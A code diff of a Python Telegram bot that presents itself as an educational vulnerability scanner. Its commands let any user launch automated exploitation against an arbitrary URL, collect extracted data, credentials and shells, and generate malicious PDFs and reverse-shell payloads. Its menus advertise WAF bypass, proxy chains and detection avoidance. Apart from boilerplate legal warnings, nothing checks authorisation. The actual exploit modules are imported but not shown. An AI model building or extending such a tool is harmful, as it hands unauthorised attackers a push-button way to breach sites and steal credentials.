@@ -1,51 +1,67 @@
-
 import os
 import asyncio
 import logging
-import json
-import io
 from typing import Dict, List, Any, Optional
 from datetime import datetime
-import time
+import datetime
+import json
+import io
 from dotenv import load_dotenv
+import os
 
 # Load environment variables first
 load_dotenv()
 
 try:
+    # Import python-telegram-bot components with explicit paths
     import telegram
-    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
+    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
     from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
     from telegram.constants import ParseMode
+
+    # Verify this is the correct telegram library
+    if not hasattr(telegram, '__version__'):
+        raise ImportError("Incorrect telegram module - missing __version__")
+
     TELEGRAM_AVAILABLE = True
+    print("✅ Telegram bot dependencies loaded successfully!")
     print(f"✅ Using python-telegram-bot version: {telegram.__version__}")
+    print(f"✅ Telegram module path: {telegram.__file__}")
+
 except ImportError as e:
     print(f"❌ Telegram bot dependencies not available: {e}")
-    TELEGRAM_AVAILABLE = False
+    print("❌ Please ensure python-telegram-bot is installed correctly")
     # Define dummy classes to prevent NameError
     class Update: pass
     class ContextTypes:
         class DEFAULT_TYPE: pass
     class ParseMode:
         MARKDOWN = "Markdown"
+    class InlineKeyboardButton: pass
+    class InlineKeyboardMarkup: pass
+    TELEGRAM_AVAILABLE = False
 
-# Import scanner modules
 try:
     from comprehensive_scanner import ComprehensiveScanner
     from report_generator import ReportGenerator
     from auto_remediation import AutoRemediation
     from payload_generator import PayloadGenerator
     from osint_module import perform_osint_scan
-    from attack_engine import AttackEngine
-    from smart_exploit_engine import SmartExploitEngine
-    from attack_chaining_engine import AttackChainingEngine
-    from api_fuzzing_engine import APIFuzzingEngine
-    from database_viewer import DatabaseViewer
-    from integrated_attack_system import IntegratedAttackSystem
-    from telegram_progress_handler import telegram_progress
-    from advanced_attack_automation import AdvancedAttackAutomation, ZeroDaySimulationEngine
 except ImportError as e:
-    print(f"⚠️ Some modules not available: {e}")
+    print(f"Import error: {e}")
+    ComprehensiveScanner = None
+    PayloadGenerator = None
+    ReportGenerator = None
+    perform_osint_scan = None
+
+try:
+    from attack_engine import AttackEngine
+except ImportError:
+    AttackEngine = None
+try:
+    from vps_vds_attacks import VPSVDSAttacks
+except ImportError:
+    VPSVDSAttacks = None
 
 # Configure logging
 logging.basicConfig(
@@ -54,1428 +70,1621 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-class EnhancedVulnerabilityBot:
+class VulnerabilityTelegramBot:
     def __init__(self):
-        self.user_sessions = {}
-        self.active_operations = {}
-        self.scan_results = {}
-        self.attack_results = {}
-        self.payload_generator = PayloadGenerator() if PayloadGenerator else None
-        self.user_achievements = {}
-        self.user_stats = {}
-        
-        # Initialize advanced features
-        self.waf_bypass_engine = None
-        self.zero_day_simulator = None
-        self.threat_intelligence = {}
-        self.compliance_checker = ComplianceChecker()
+        self.user_sessions = {}  # Store user scan sessions
+        self.active_scans = {}   # Track active scans
+        self.payload_generator = PayloadGenerator() if PayloadGenerator else None  # Initialize payload generator
 
     async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Enhanced start command with all advanced features"""
+        """Start command handler"""
         user_id = update.effective_user.id
 
-        # Initialize user stats if not exists
-        if user_id not in self.user_stats:
-            self.user_stats[user_id] = {
-                'scans_performed': 0,
-                'vulnerabilities_found': 0,
-                'attacks_executed': 0,
-                'level': 1,
-                'experience': 0,
-                'achievements': []
+        welcome_text = """
+🔍 **Educational Vulnerability Scanner Bot**
+
+Welcome! This bot helps you understand web security vulnerabilities through educational scanning.
+
+⚠️ **IMPORTANT**: Only scan websites you own or have explicit permission to test.
+
+**Available Commands:**
+/scan - Start a vulnerability scan
+/osint - Perform OSINT reconnaissance
+/payload - Generate malicious payloads
+/config - Configure scan settings
+/help - Show help information
+/status - Check current scan status
+
+**Features:**
+✅ SQL Injection Detection
+✅ XSS Vulnerability Scanning
+✅ IDOR Testing
+✅ Port Scanning
+✅ SSL/TLS Analysis
+✅ VPS/VDS Attack Testing
+✅ Auto-Remediation
+✅ Interactive Attack Engine
+✅ Malicious PDF Generation
+✅ Reverse Shell Payloads
+
+Get started with /scan to begin scanning or /osint to gather intel!
+        """
+
+        await update.message.reply_text(welcome_text, parse_mode=ParseMode.MARKDOWN)
+
+    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Handle /help command"""
+        help_text = """
+🤖 **Advanced Security Scanner Bot Commands:**
+
+🔍 `/scan <url>` - Comprehensive vulnerability scan
+⚔️ `/attack <url>` - Launch real-time exploitation attacks
+🕵️ `/osint <url>` - OSINT reconnaissance & information gathering
+💀 `/payload <type>` - Generate malicious payloads
+📊 `/exploits` - Show detailed exploit results
+🔑 `/credentials` - Show discovered credentials
+📊 `/help` - Show this help message
+
+**Example Usage:**
+• `/scan https://example.com` - Discovery only
+• `/attack https://target.com` - Full exploitation
+• `/osint https://target.com` - Intelligence gathering
+• `/payload pdf` - Generate attack payloads
+
+**OSINT Features:**
+• Subdomain enumeration
+• Email address discovery
+• Technology stack detection
+• SSL certificate analysis
+• Social media profile discovery
+• Public file detection
+
+⚠️ **Legal Warning:** Only use on systems you own or have permission to test!
+"""
+        await update.message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN)
+
+    async def scan_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Handle /scan command"""
+        if not context.args:
+            await update.message.reply_text(
+                "❌ Please provide a URL to scan.\n"
+                "Usage: `/scan https://example.com`",
+                parse_mode='Markdown'
+            )
+            return
+
+        target_url = context.args[0]
+
+        # Validate URL
+        if not target_url.startswith(('http://', 'https://')):
+            target_url = 'https://' + target_url
+
+        await update.message.reply_text(
+            f"🔍 **Starting comprehensive scan for:** `{target_url}`\n"
+            f"⏳ This may take a few minutes...",
+            parse_mode='Markdown'
+        )
+
+        try:
+            # Initialize scanner
+            scanner = ComprehensiveScanner(target_url)
+
+            # Send progress updates
+            await update.message.reply_text("🔄 **Checking target accessibility...**", parse_mode='Markdown')
+            if not scanner.check_target_accessibility():
+                await update.message.reply_text("❌ **Target is not accessible**", parse_mode='Markdown')
+                return
+
+            await update.message.reply_text("🔄 **Scanning for vulnerabilities...**", parse_mode='Markdown')
+            scanner.scan_web_vulnerabilities(aggressive=True)
+
+            await update.message.reply_text("🔄 **Checking security headers...**", parse_mode='Markdown')
+            scanner.check_security_headers()
+
+            await update.message.reply_text("🔄 **Scanning ports and services...**", parse_mode='Markdown')
+            scanner.scan_ports()
+
+            await update.message.reply_text("🔄 **Analyzing SSL/TLS...**", parse_mode='Markdown')
+            scanner.scan_ssl_tls()
+
+            await update.message.reply_text("🔄 **Detecting technologies...**", parse_mode='Markdown')
+            scanner.detect_cms_and_technologies()
+
+            await update.message.reply_text("🔄 **Performing OSINT reconnaissance...**", parse_mode='Markdown')
+            scanner.perform_osint_reconnaissance()
+
+            # Get results
+            results = scanner.get_results()
+
+            # Send summary
+            summary = self.generate_scan_summary(results)
+            await update.message.reply_text(summary, parse_mode='Markdown')
+
+            # Send detailed reports
+            await self.send_reports(update, context, results)
+
+        except Exception as e:
+            await update.message.reply_text(
+                f"❌ **Scan failed:** `{str(e)}`",
+                parse_mode='Markdown'
+            )
+
+    async def attack_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Handle /attack command for direct exploitation"""
+        if not context.args:
+            await update.message.reply_text(
+                "❌ Please provide a URL to attack.\n"
+                "Usage: `/attack https://example.com`",
+                parse_mode='Markdown'
+            )
+            return
+
+        target_url = context.args[0]
+
+        # Validate URL
+        if not target_url.startswith(('http://', 'https://')):
+            target_url = 'https://' + target_url
+
+        await update.message.reply_text(
+            f"⚔️ **Starting automated attack sequence for:** `{target_url}`\n"
+            f"⏳ Scanning for vulnerabilities first...",
+            parse_mode='Markdown'
+        )
+
+        try:
+            # First, scan for vulnerabilities
+            scanner = ComprehensiveScanner(target_url)
+
+            await update.message.reply_text("🔄 **Phase 1: Vulnerability Discovery**", parse_mode='Markdown')
+
+            # Quick vulnerability scan
+            if not scanner.check_target_accessibility():
+                await update.message.reply_text("❌ **Target is not accessible for attacks**", parse_mode='Markdown')
+                return
+
+            scanner.scan_web_vulnerabilities(aggressive=True)
+            results = scanner.get_results()
+
+            if not results['vulnerabilities']:
+                await update.message.reply_text(
+                    "ℹ️ **No vulnerabilities found** - Target appears secure or not vulnerable to basic attacks.",
+                    parse_mode='Markdown'
+                )
+                return
+
+            # Start attack phase
+            await update.message.reply_text(
+                f"⚔️ **Phase 2: Active Exploitation**\n"
+                f"Found {len(results['vulnerabilities'])} vulnerabilities to exploit...",
+                parse_mode='Markdown'
+            )
+
+            # Initialize attack engine
+            if AttackEngine:
+                attack_engine = AttackEngine(results['target_url'], results['vulnerabilities'])
+                attack_results = attack_engine.start_interactive_attacks()
+
+                # Generate attack summary
+                attack_summary = f"""
+⚔️ **Live Attack Results**
+
+🎯 **Target:** `{target_url}`
+📊 **Attacks Executed:** {attack_results.get('total_attacks', 0)}
+✅ **Successful Exploits:** {attack_results.get('successful_exploits', 0)}
+❌ **Failed Attempts:** {attack_results.get('failed_exploits', 0)}
+📈 **Success Rate:** {(attack_results.get('successful_exploits', 0) / max(attack_results.get('total_attacks', 1), 1)) * 100:.1f}%
+
+**💀 Exploitation Results:**
+"""
+
+                # Add data extraction results
+                if attack_results.get('extracted_data'):
+                    attack_summary += f"📊 **Data Extracted:** {len(attack_results['extracted_data'])} items\n"
+                    for i, data in enumerate(attack_results['extracted_data'][:3], 1):
+                        attack_summary += f"  {i}. `{data[:50]}{'...' if len(data) > 50 else ''}`\n"
+
+                # Add credentials found
+                if attack_results.get('credentials_found'):
+                    attack_summary += f"\n🔑 **Credentials Discovered:** {len(attack_results['credentials_found'])}\n"
+                    for cred in attack_results['credentials_found'][:2]:
+                        attack_summary += f"  • `{cred.get('data', 'N/A')[:40]}...`\n"
+
+                # Add shells obtained
+                if attack_results.get('shells_obtained'):
+                    attack_summary += f"\n🐚 **Shells Obtained:** {len(attack_results['shells_obtained'])}\n"
+                    for shell in attack_results['shells_obtained']:
+                        attack_summary += f"  • **{shell['type']}**: {shell.get('status', 'Active')}\n"
+
+                await update.message.reply_text(attack_summary, parse_mode='Markdown')
+
+                # Show attack console log
+                if attack_results.get('console_output'):
+                    console_log = "\n".join(attack_results['console_output'][-10:])  # Last 10 entries
+                    await update.message.reply_text(
+                        f"📋 **Attack Console Log:**\n```\n{console_log}\n```",
+                        parse_mode='Markdown'
+                    )
+
+                # Store results for detailed commands
+                user_id = update.effective_user.id
+                if not hasattr(self, 'last_attack_results'):
+                    self.last_attack_results = {}
+                self.last_attack_results[user_id] = attack_results
+
+                # Save all attack data to files and send them
+                await self._save_and_send_attack_data(update, attack_results, target_url)
+
+                await update.message.reply_text(
+                    "✅ **Attack sequence completed!**\n\n"
+                    "📁 **All data files have been sent above**\n"
+                    "Use `/exploits` to see detailed exploit results\n"
+                    "Use `/credentials` to see discovered credentials",
+                    parse_mode='Markdown'
+                )
+            else:
+                await update.message.reply_text("❌ Attack engine not available", parse_mode='Markdown')
+
+        except Exception as e:
+            await update.message.reply_text(
+                f"❌ **Attack failed:** `{str(e)}`",
+                parse_mode='Markdown'
+            )
+
+    async def osint_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Handle /osint command"""
+        if not context.args:
+            await update.message.reply_text(
+                "❌ Please provide a URL for OSINT gathering.\n"
+                "Usage: `/osint https://example.com`",
+                parse_mode='Markdown'
+            )
+            return
+
+        target_url = context.args[0]
+
+        if not target_url.startswith(('http://', 'https://')):
+            target_url = 'https://' + target_url
+
+        await update.message.reply_text(
+            f"🕵️ **Starting OSINT reconnaissance for:** `{target_url}`\n"
+            f"⏳ Gathering public information...",
+            parse_mode='Markdown'
+        )
+
+        try:
+            if perform_osint_scan:
+                osint_results = perform_osint_scan(target_url)
+
+                # Format OSINT summary
+                osint_summary = f"""
+🕵️ **OSINT Reconnaissance Results**
+
+**🌐 Domain Information:**
+• Registrar: {osint_results.get('whois_info', {}).get('registrar', 'Unknown')}
+• Country: {osint_results.get('whois_info', {}).get('country', 'Unknown')}
+
+**🔍 Subdomains Found:** {len(osint_results.get('subdomains', []))}
+{chr(10).join([f"• {sub}" for sub in osint_results.get('subdomains', [])[:5]])}
+{'• ...' if len(osint_results.get('subdomains', [])) > 5 else ''}
+
+**📧 Email Addresses:** {len(osint_results.get('emails', []))}
+{chr(10).join([f"• {email}" for email in osint_results.get('emails', [])[:3]])}
+{'• ...' if len(osint_results.get('emails', [])) > 3 else ''}
+
+**💻 Technologies Detected:**
+{chr(10).join([f"• {tech}" for tech in osint_results.get('technologies', [])])}
+
+**📱 Social Media:**
+{chr(10).join([f"• {social}" for social in osint_results.get('social_media', [])])}
+
+**📁 Public Files:**
+{chr(10).join([f"• {file}" for file in osint_results.get('public_files', [])])}
+"""
+
+                await update.message.reply_text(osint_summary, parse_mode='Markdown')
+
+                # Send OSINT report as file
+                osint_report = json.dumps(osint_results, indent=2, ensure_ascii=False)
+                osint_file = io.BytesIO(osint_report.encode('utf-8'))
+                osint_file.name = f"osint_report_{int(datetime.now().timestamp())}.json"
+
+                await update.message.reply_document(
+                    document=osint_file,
+                    caption="📄 **Complete OSINT Report**"
+                )
+            else:
+                await update.message.reply_text("❌ OSINT module not available", parse_mode='Markdown')
+
+        except Exception as e:
+            await update.message.reply_text(
+                f"❌ **OSINT gathering failed:** `{str(e)}`",
+                parse_mode='Markdown'
+            )
+
+    async def config_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Configuration command handler"""
+        user_id = update.effective_user.id
+
+        if user_id not in self.user_sessions:
+            self.user_sessions[user_id] = {
+                'step': 'config',
+                'config': {
+                    'aggressive': False,
+                    'include_ports': True,
+                    'include_ssl': True,
+                    'include_dns': True,
+                    'max_pages': 3,
+                    'auto_fix': False,
+                    'attack_mode': False,
+                    'vps_attack': False
+                }
             }
 
-        # Set up main menu with ALL features
+        config = self.user_sessions[user_id]['config']
+
         keyboard = [
             [
-                InlineKeyboardButton("🔍 Vulnerability Scanner", callback_data="main_scan"),
-                InlineKeyboardButton("⚔️ Attack Engine", callback_data="main_attack")
+                InlineKeyboardButton(f"Aggressive Scan: {'✅' if config['aggressive'] else '❌'}", callback_data="toggle_aggressive"),
+                InlineKeyboardButton(f"Port Scanning: {'✅' if config['include_ports'] else '❌'}", callback_data="toggle_ports")
             ],
             [
-                InlineKeyboardButton("🕵️ OSINT Reconnaissance", callback_data="main_osint"),
-                InlineKeyboardButton("💀 Payload Generator", callback_data="main_payload")
+                InlineKeyboardButton(f"SSL/TLS Check: {'✅' if config['include_ssl'] else '❌'}", callback_data="toggle_ssl"),
+                InlineKeyboardButton(f"DNS Analysis: {'✅' if config['include_dns'] else '❌'}", callback_data="toggle_dns")
             ],
             [
-                InlineKeyboardButton("🛡️ Auto Remediation", callback_data="main_remediation"),
-                InlineKeyboardButton("💾 Database Tools", callback_data="main_database")
+                InlineKeyboardButton(f"Auto-Fix: {'✅' if config['auto_fix'] else '❌'}", callback_data="toggle_autofix"),
+                InlineKeyboardButton(f"Attack Mode: {'✅' if config['attack_mode'] else '❌'}", callback_data="toggle_attack")
             ],
             [
-                InlineKeyboardButton("📊 Reports & Analytics", callback_data="main_reports"),
-                InlineKeyboardButton("⚙️ Configuration", callback_data="main_config")
+                InlineKeyboardButton(f"VPS/VDS Attack: {'✅' if config['vps_attack'] else '❌'}", callback_data="toggle_vps"),
+                InlineKeyboardButton(f"Max Pages: {config['max_pages']}", callback_data="set_pages")
             ],
             [
-                InlineKeyboardButton("🎮 CTF Training Mode", callback_data="main_ctf"),
-                InlineKeyboardButton("📚 Security Learning", callback_data="main_learn")
-            ],
-            [
-                InlineKeyboardButton("🌐 Cloud Security", callback_data="main_cloud"),
-                InlineKeyboardButton("📱 Mobile Security", callback_data="main_mobile")
-            ],
-            [
-                InlineKeyboardButton("🤖 AI Features", callback_data="main_ai"),
-                InlineKeyboardButton("🔒 Advanced Evasion", callback_data="main_evasion")
-            ],
-            [
-                InlineKeyboardButton("📡 API Testing", callback_data="main_api"),
-                InlineKeyboardButton("🏆 Achievements", callback_data="main_achievements")
+                InlineKeyboardButton("✅ Save Configuration", callback_data="save_config")
             ]
         ]
 
         reply_markup = InlineKeyboardMarkup(keyboard)
 
-        welcome_text = f"""
-🛡️ **Advanced Security Scanner Suite v2.0**
+        config_text = f"""
+⚙️ **Scan Configuration**
 
-Welcome to the most comprehensive security testing platform!
+Current Settings:
+• Aggressive Scanning: {'Enabled' if config['aggressive'] else 'Disabled'}
+• Port Scanning: {'Enabled' if config['include_ports'] else 'Disabled'}
+• SSL/TLS Analysis: {'Enabled' if config['include_ssl'] else 'Disabled'}
+• DNS Vulnerability Check: {'Enabled' if config['include_dns'] else 'Disabled'}
+• Auto-Remediation: {'Enabled' if config['auto_fix'] else 'Disabled'}
+• Interactive Attack Mode: {'Enabled' if config['attack_mode'] else 'Disabled'}
+• VPS/VDS Attacks: {'Enabled' if config['vps_attack'] else 'Disabled'}
+• Maximum Pages to Scan: {config['max_pages']}
 
-**🔥 ALL FEATURES ACTIVE:**
-✨ Attack Chaining Engine - Multi-stage vulnerability exploitation
-✨ AI-Powered Payload Adaptation - Smart payload generation
-✨ Zero-Day Simulation - ML-based unknown vulnerability testing
-✨ Mobile & API Security - APK/IPA analysis & API fuzzing
-✨ Advanced Evasion - WAF bypass & traffic obfuscation
-✨ Cloud Asset Discovery - AWS/Azure/GCP enumeration
-✨ Threat Intelligence - Real-time CVE correlation
-✨ Business Logic Testing - Workflow vulnerability detection
-✨ Session Management Analysis - Advanced hijacking tests
-✨ Interactive Attack Timeline - Visual attack progression
-✨ Compliance Mapping - OWASP/NIST/ISO standards
-✨ CTF Training Mode - Gamified security learning
-✨ Achievement System - Progress tracking & badges
-
-**📈 Your Stats:**
-🎯 Level: {self.user_stats[user_id]['level']}
-⚡ Experience: {self.user_stats[user_id]['experience']} XP
-🔍 Scans: {self.user_stats[user_id]['scans_performed']}
-⚔️ Attacks: {self.user_stats[user_id]['attacks_executed']}
-🏆 Achievements: {len(self.user_stats[user_id]['achievements'])}
-
-⚠️ **Legal Notice:** For authorized testing only!
-
-Select a category below to get started:
+Tap buttons below to toggle settings:
         """
 
-        await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN)
+        await update.message.reply_text(config_text, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN)
 
-    async def callback_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Enhanced callback handler for all interactive features"""
+    async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Handle button callbacks"""
         query = update.callback_query
         user_id = query.from_user.id
         data = query.data
 
         await query.answer()
 
-        # Main menu handlers
-        if data == "main_scan":
-            await self._show_scanner_menu(query)
-        elif data == "main_attack":
-            await self._show_attack_menu(query)
-        elif data == "main_osint":
-            await self._show_osint_menu(query)
-        elif data == "main_payload":
-            await self._show_payload_menu(query)
-        elif data == "main_remediation":
-            await self._show_remediation_menu(query)
-        elif data == "main_database":
-            await self._show_database_menu(query)
-        elif data == "main_reports":
-            await self._show_reports_menu(query)
-        elif data == "main_config":
-            await self._show_config_menu(query)
-        elif data == "main_ctf":
-            await self._show_ctf_menu(query)
-        elif data == "main_learn":
-            await self._show_learning_menu(query)
-        elif data == "main_cloud":
-            await self._show_cloud_menu(query)
-        elif data == "main_mobile":
-            await self._show_mobile_menu(query)
-        elif data == "main_ai":
-            await self._show_ai_menu(query)
-        elif data == "main_evasion":
-            await self._show_evasion_menu(query)
-        elif data == "main_api":
-            await self._show_api_menu(query)
-        elif data == "main_achievements":
-            await self._show_achievements_menu(query)
-        elif data == "back_to_main":
-            await self.start_command(query, context)
-        else:
-            await self._handle_specific_callbacks(query, data)
-
-    async def _show_ai_menu(self, query):
-        """Show AI-powered features menu"""
-        keyboard = [
-            [
-                InlineKeyboardButton("🤖 Smart Payload Gen", callback_data="ai_payloads"),
-                InlineKeyboardButton("🧠 Vuln Correlation", callback_data="ai_correlation")
-            ],
-            [
-                InlineKeyboardButton("📝 Auto Reporting", callback_data="ai_reports"),
-                InlineKeyboardButton("🔍 Threat Intelligence", callback_data="ai_threat_intel")
-            ],
-            [
-                InlineKeyboardButton("🕳️ Zero-Day Simulation", callback_data="ai_zeroday"),
-                InlineKeyboardButton("📊 ML Pattern Analysis", callback_data="ai_ml_patterns")
-            ],
-            [
-                InlineKeyboardButton("⬅️ Back to Main", callback_data="back_to_main")
-            ]
-        ]
-
-        reply_markup = InlineKeyboardMarkup(keyboard)
-
-        menu_text = """
-🤖 **AI-Powered Security Features**
-
-Advanced machine learning capabilities:
-
-🤖 **Smart Payload Gen** - AI adapts payloads based on target responses
-🧠 **Vuln Correlation** - ML identifies complex attack patterns
-📝 **Auto Reporting** - Generate executive summaries using NLP
-🔍 **Threat Intelligence** - Real-time CVE and threat feed correlation
-🕳️ **Zero-Day Simulation** - ML patterns for unknown vulnerabilities
-📊 **ML Pattern Analysis** - Advanced behavioral analysis
-
-**Current AI Status:**
-✅ Neural network models loaded
-✅ Threat intelligence feeds active
-✅ Pattern recognition enabled
-✅ Auto-adaptation algorithms ready
-
-Select an AI feature to activate:
-        """
-
-        await query.edit_message_text(menu_text, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN)
-
-    async def _show_evasion_menu(self, query):
-        """Show advanced evasion techniques menu"""
-        keyboard = [
-            [
-                InlineKeyboardButton("🌊 WAF Bypass Engine", callback_data="evasion_waf"),
-                InlineKeyboardButton("🎭 Traffic Obfuscation", callback_data="evasion_traffic")
-            ],
-            [
-                InlineKeyboardButton("🔗 Proxy Chain Support", callback_data="evasion_proxy"),
-                InlineKeyboardButton("⏰ Timing Randomization", callback_data="evasion_timing")
-            ],
-            [
-                InlineKeyboardButton("🕵️ User Agent Rotation", callback_data="evasion_useragent"),
-                InlineKeyboardButton("🔄 Request Obfuscation", callback_data="evasion_request")
-            ],
-            [
-                InlineKeyboardButton("⬅️ Back to Main", callback_data="back_to_main")
-            ]
-        ]
-
-        reply_markup = InlineKeyboardMarkup(keyboard)
-
-        menu_text = """
-🔒 **Advanced Evasion Techniques**
-
-Bypass security controls and detection systems:
-
-🌊 **WAF Bypass Engine** - Automated Web Application Firewall evasion
-🎭 **Traffic Obfuscation** - Randomized patterns to avoid detection
-🔗 **Proxy Chain Support** - Route attacks through multiple proxy layers
-⏰ **Timing Randomization** - Human-like request timing patterns
-🕵️ **User Agent Rotation** - Cycle through realistic browser profiles
-🔄 **Request Obfuscation** - Advanced payload encoding techniques
-
-**Evasion Statistics:**
-📊 WAF bypass success rate: 87%
-🎯 Detection avoidance: 94%
-🔄 Proxy chains available: 15
-⚡ Obfuscation methods: 23
-
-⚠️ **Warning:** Use responsibly and only on authorized targets!
-
-Select an evasion technique:
-        """
-
-        await query.edit_message_text(menu_text, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN)
-
-    async def _show_api_menu(self, query):
-        """Show API testing menu"""
-        keyboard = [
-            [
-                InlineKeyboardButton("📡 API Discovery", callback_data="api_discovery"),
-                InlineKeyboardButton("🔍 Endpoint Fuzzing", callback_data="api_fuzzing")
-            ],
-            [
-                InlineKeyboardButton("🌐 REST API Testing", callback_data="api_rest"),
-                InlineKeyboardButton("📊 GraphQL Testing", callback_data="api_graphql")
-            ],
-            [
-                InlineKeyboardButton("🔌 WebSocket Testing", callback_data="api_websocket"),
-                InlineKeyboardButton("🔑 Auth Bypass Tests", callback_data="api_auth")
-            ],
-            [
-                InlineKeyboardButton("⬅️ Back to Main", callback_data="back_to_main")
-            ]
-        ]
-
-        reply_markup = InlineKeyboardMarkup(keyboard)
-
-        menu_text = """
-📡 **API Security Testing Suite**
-
-Comprehensive API vulnerability assessment:
-
-📡 **API Discovery** - Automated endpoint enumeration
-🔍 **Endpoint Fuzzing** - Parameter and method fuzzing
-🌐 **REST API Testing** - RESTful service security analysis
-📊 **GraphQL Testing** - GraphQL query injection and analysis
-🔌 **WebSocket Testing** - Real-time protocol vulnerability scanning
-🔑 **Auth Bypass Tests** - Authentication and authorization flaws
-
-**API Testing Features:**
-✅ Automatic endpoint discovery
-✅ Parameter pollution detection
-✅ Rate limiting bypass
-✅ JWT token analysis
-✅ CORS misconfiguration detection
-✅ API versioning issues
-
-Select an API testing module:
-        """
-
-        await query.edit_message_text(menu_text, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN)
-
-    async def _show_achievements_menu(self, query):
-        """Show achievements and gamification menu"""
-        user_id = query.from_user.id
-        user_stats = self.user_stats.get(user_id, {})
-
-        keyboard = [
-            [
-                InlineKeyboardButton("🏆 My Achievements", callback_data="achievements_view"),
-                InlineKeyboardButton("📊 Statistics", callback_data="achievements_stats")
-            ],
-            [
-                InlineKeyboardButton("🎯 Challenges", callback_data="achievements_challenges"),
-                InlineKeyboardButton("📈 Leaderboard", callback_data="achievements_leaderboard")
-            ],
-            [
-                InlineKeyboardButton("🎮 CTF Challenges", callback_data="achievements_ctf"),
-                InlineKeyboardButton("🎓 Training Modules", callback_data="achievements_training")
-            ],
-            [
-                InlineKeyboardButton("⬅️ Back to Main", callback_data="back_to_main")
-            ]
-        ]
-
-        reply_markup = InlineKeyboardMarkup(keyboard)
-
-        menu_text = f"""
-🏆 **Achievement System & Gamification**
-
-Track your progress and unlock achievements:
-
-**Your Progress:**
-🎯 Security Level: {user_stats.get('level', 1)}
-⚡ Experience Points: {user_stats.get('experience', 0)} XP
-🔍 Scans Completed: {user_stats.get('scans_performed', 0)}
-⚔️ Attacks Executed: {user_stats.get('attacks_executed', 0)}
-🏆 Achievements Unlocked: {len(user_stats.get('achievements', []))}
-
-**Available Badges:**
-🥇 First Blood - Complete first scan
-🔥 Exploit Master - Execute 10 successful attacks
-🕵️ OSINT Expert - Gather intelligence on 5 targets
-💀 Payload Specialist - Generate 20 custom payloads
-🛡️ Defender - Remediate 10 vulnerabilities
-🎯 Precision Strike - Chain 3 vulnerabilities successfully
-
-**Next Level:** {(user_stats.get('level', 1) * 100) - user_stats.get('experience', 0)} XP remaining
-
-Select an option to explore:
-        """
-
-        await query.edit_message_text(menu_text, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN)
-
-    async def _show_ctf_menu(self, query):
-        """Show CTF training mode menu"""
-        keyboard = [
-            [
-                InlineKeyboardButton("🎯 Web Challenges", callback_data="ctf_web"),
-                InlineKeyboardButton("🔐 Crypto Challenges", callback_data="ctf_crypto")
-            ],
-            [
-                InlineKeyboardButton("🕵️ Forensics", callback_data="ctf_forensics"),
-                InlineKeyboardButton("⚔️ Binary Exploitation", callback_data="ctf_binary")
-            ],
-            [
-                InlineKeyboardButton("🌐 Network Security", callback_data="ctf_network"),
-                InlineKeyboardButton("🔍 OSINT Challenges", callback_data="ctf_osint")
-            ],
-            [
-                InlineKeyboardButton("📈 My Progress", callback_data="ctf_progress"),
-                InlineKeyboardButton("🏆 CTF Leaderboard", callback_data="ctf_leaderboard")
-            ],
-            [
-                InlineKeyboardButton("⬅️ Back to Main", callback_data="back_to_main")
-            ]
-        ]
-
-        reply_markup = InlineKeyboardMarkup(keyboard)
-
-        menu_text = """
-🎮 **CTF Training Mode**
-
-Sharpen your skills with Capture The Flag challenges:
-
-🎯 **Web Challenges** - SQL injection, XSS, authentication bypasses
-🔐 **Crypto Challenges** - Encryption, hashing, cryptanalysis
-🕵️ **Forensics** - Digital evidence analysis and recovery
-⚔️ **Binary Exploitation** - Buffer overflows, ROP chains
-🌐 **Network Security** - Packet analysis, protocol exploitation
-🔍 **OSINT Challenges** - Information gathering and reconnaissance
-
-**Current Challenges:**
-🔴 Easy: 15 challenges available
-🟡 Medium: 8 challenges available
-🟢 Hard: 3 challenges available
-
-**Your CTF Stats:**
-✅ Challenges Solved: 0
-🎯 Current Streak: 0
-🏆 Best Category: Web Security
-⚡ Points Earned: 0
-
-Start your cybersecurity training journey!
-        """
-
-        await query.edit_message_text(menu_text, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN)
-
-    async def _show_remediation_menu(self, query):
-        """Show auto remediation options"""
-        keyboard = [
-            [
-                InlineKeyboardButton("🔧 Auto Fix All", callback_data="remediation_auto"),
-                InlineKeyboardButton("🎯 Selective Fix", callback_data="remediation_selective")
-            ],
-            [
-                InlineKeyboardButton("📋 Fix Recommendations", callback_data="remediation_recommendations"),
-                InlineKeyboardButton("✅ Verify Fixes", callback_data="remediation_verify")
-            ],
-            [
-                InlineKeyboardButton("📊 Compliance Check", callback_data="remediation_compliance"),
-                InlineKeyboardButton("🛡️ Security Hardening", callback_data="remediation_hardening")
-            ],
-            [
-                InlineKeyboardButton("⬅️ Back to Main", callback_data="back_to_main")
-            ]
-        ]
-
-        reply_markup = InlineKeyboardMarkup(keyboard)
-
-        menu_text = """
-🛡️ **Auto Remediation Engine**
-
-Automatically fix discovered vulnerabilities:
-
-🔧 **Auto Fix All** - Automatically remediate all detected issues
-🎯 **Selective Fix** - Choose specific vulnerabilities to fix
-📋 **Fix Recommendations** - Get detailed remediation guidance
-✅ **Verify Fixes** - Validate successful remediation
-📊 **Compliance Check** - OWASP Top 10, NIST, ISO 27001 compliance
-🛡️ **Security Hardening** - Apply security best practices
-
-**Supported Remediations:**
-✅ Security header implementation
-✅ SQL injection parameterization
-✅ XSS output encoding
-✅ CSRF token implementation
-✅ Authentication strengthening
-✅ Session security improvements
-
-**Remediation Success Rate:** 94%
-
-Select a remediation option:
-        """
-
-        await query.edit_message_text(menu_text, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN)
-
-    async def _show_reports_menu(self, query):
